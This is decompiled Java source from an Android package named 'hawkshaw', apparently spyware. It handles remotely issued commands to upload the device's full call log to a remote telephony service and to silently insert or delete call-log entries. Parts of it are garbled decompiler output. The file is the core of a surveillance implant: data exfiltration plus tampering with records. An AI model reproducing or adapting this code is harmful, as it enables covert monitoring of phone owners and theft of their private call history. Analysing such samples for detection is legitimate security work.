package com.hawkshaw.library.features.telephony.calllogs;

import W2.y;
import a3.e;
import android.net.Uri;
import b3.C0298a;
import com.hawkshaw.library.App;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;

public final class HandlerKt {
    private static final String TAG = "CallLogsHandler";

    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;

        /* JADX WARNING: Can't wrap try/catch for region: R(9:0|1|2|3|4|5|6|7|9) */
        /* JADX WARNING: Failed to process nested try/catch */
        /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x0010 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:5:0x0019 */
        static {
            
                com.hawkshaw.library.datalayer.models.Command$CommandType[] r0 = com.hawkshaw.library.datalayer.models.Command.CommandType.values()
                int r0 = r0.length
                int[] r0 = new int[r0]
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushCallLogs     // Catch:{ NoSuchFieldError -> 0x0010 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                r2 = 1
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0010 }
            L_0x0010:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.AddCallLog     // Catch:{ NoSuchFieldError -> 0x0019 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                r2 = 2
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
            L_0x0019:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.DeleteCallLog     // Catch:{ NoSuchFieldError -> 0x0022 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0022 }
                r2 = 3
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0022 }
            L_0x0022:
                $EnumSwitchMapping$0 = r0
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.telephony.calllogs.HandlerKt.WhenMappings.<clinit>():void");
        }
    }

    private static final void addCallLog(Command.AddCallLogRequest addCallLogRequest) {
        if (addCallLogRequest != null) {
            if (!ManifestPermissionsKt.hasPermission("android.permission.WRITE_CALL_LOG")) {
                Logger.e$default(Logger.INSTANCE, TAG, "AddCallLog: You don't have permission to write call logs", (Exception) null, false, 12, (Object) null);
                return;
            }
            Uri addCallLog = AddCallLogKt.addCallLog(App.Companion.getContext(), addCallLogRequest.getCallLog());
            Logger logger = Logger.INSTANCE;
            String name = addCallLogRequest.getCallLog().getName();
            logger.d(TAG, "AddCallLog: " + addCallLog + ", " + name, true);
        }
    }

    private static final void deleteCallLog(Command.DeleteCallLogRequest deleteCallLogRequest) {
        if (deleteCallLogRequest != null) {
            if (!ManifestPermissionsKt.hasPermission("android.permission.WRITE_CALL_LOG")) {
                Logger.e$default(Logger.INSTANCE, TAG, "DeleteCallLog: You don't have permission to write call logs", (Exception) null, false, 12, (Object) null);
                return;
            }
            Logger.INSTANCE.d(TAG, C0528x.e("DeleteCallLog: ", DeleteCallLogKt.deleteCallLog(App.Companion.getContext(), deleteCallLogRequest.getId()) ? "Success" : "Failed", " for ", deleteCallLogRequest.getId()), true);
        }
    }

    public static final Object handleCallLogsCommand(Command command, e eVar) {
        int i5 = WhenMappings.$EnumSwitchMapping$0[command.getType().ordinal()];
        y yVar = y.f2418a;
        if (i5 != 1) {
            if (i5 == 2) {
                addCallLog(command.getAddCallLogRequest());
            } else if (i5 == 3) {
                deleteCallLog(command.getDeleteCallLogRequest());
            }
            return yVar;
        }
        Object pushCallLogs = pushCallLogs(eVar);
        return pushCallLogs == C0298a.f4140D ? pushCallLogs : yVar;
    }

    /* JADX WARNING: type inference failed for: r0v4, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:14:0x0038  */
    /* JADX WARNING: Removed duplicated region for block: B:23:0x0081 A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0024  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object pushCallLogs(a3.e r13) {
        
            boolean r0 = r13 instanceof R1.a
            if (r0 == 0) goto L_0x0013
            r0 = r13
            R1.a r0 = (R1.a) r0
            int r1 = r0.f1804E
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1804E = r1
            goto L_0x0018
        L_0x0013:
            R1.a r0 = new R1.a
            r0.<init>(r13)
        L_0x0018:
            java.lang.Object r13 = r0.f1803D
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1804E
            W2.y r3 = W2.y.f2418a
            r4 = 2
            r5 = 1
            if (r2 == 0) goto L_0x0038
            if (r2 == r5) goto L_0x0034
            if (r2 != r4) goto L_0x002c
            Y1.C0110h.P(r13)
            goto L_0x0082
        L_0x002c:
            java.lang.IllegalStateException r13 = new java.lang.IllegalStateException
            java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
            r13.<init>(r0)
            throw r13
        L_0x0034:
            Y1.C0110h.P(r13)
            goto L_0x0068
        L_0x0038:
            Y1.C0110h.P(r13)
            java.lang.String r13 = "android.permission.READ_CALL_LOG"
            boolean r13 = com.hawkshaw.library.ktextensions.ManifestPermissionsKt.hasPermission((java.lang.String) r13)
            if (r13 != 0) goto L_0x0052
            com.hawkshaw.library.logger.Logger r6 = com.hawkshaw.library.logger.Logger.INSTANCE
            r11 = 12
            r12 = 0
            java.lang.String r7 = "CallLogsHandler"
            java.lang.String r8 = "ReadCallLogs: You don't have permission to read call logs"
            r9 = 0
            r10 = 0
            com.hawkshaw.library.logger.Logger.e$default(r6, r7, r8, r9, r10, r11, r12)
            return r3
        L_0x0052:
            com.hawkshaw.library.App$Companion r13 = com.hawkshaw.library.App.Companion
            android.content.Context r13 = r13.getContext()
            android.content.ContentResolver r13 = r13.getContentResolver()
            Y1.K.k(r13)
            r0.f1804E = r5
            java.lang.Object r13 = com.hawkshaw.library.features.telephony.calllogs.GetCallLogsKt.getCallLogs(r13, r0)
            if (r13 != r1) goto L_0x0068
            return r1
        L_0x0068:
            java.util.List r13 = (java.util.List) r13
            com.hawkshaw.library.datalayer.Injector$Companion r2 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r2 = r2.getInstance()
            com.hawkshaw.library.datalayer.network.service.TelephonyService r2 = r2.getTelephonyService()
            com.hawkshaw.library.datalayer.models.PushCallLogsRequest r5 = new com.hawkshaw.library.datalayer.models.PushCallLogsRequest
            r5.<init>(r13)
            r0.f1804E = r4
            java.lang.Object r13 = r2.pushCallLogs(r5, r0)
            if (r13 != r1) goto L_0x0082
            return r1
        L_0x0082:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r13 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r13
            com.hawkshaw.library.logger.Logger r4 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r13 = r13.getState()
            java.lang.String r0 = "PushCallLogs: "
            java.lang.String r6 = i.C0528x.h(r0, r13)
            r8 = 4
            r9 = 0
            java.lang.String r5 = "CallLogsHandler"
            r7 = 0
            com.hawkshaw.library.logger.Logger.d$default(r4, r5, r6, r7, r8, r9)
            return r3
        
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.telephony.calllogs.HandlerKt.pushCallLogs(a3.e):java.lang.Object");
    }
}
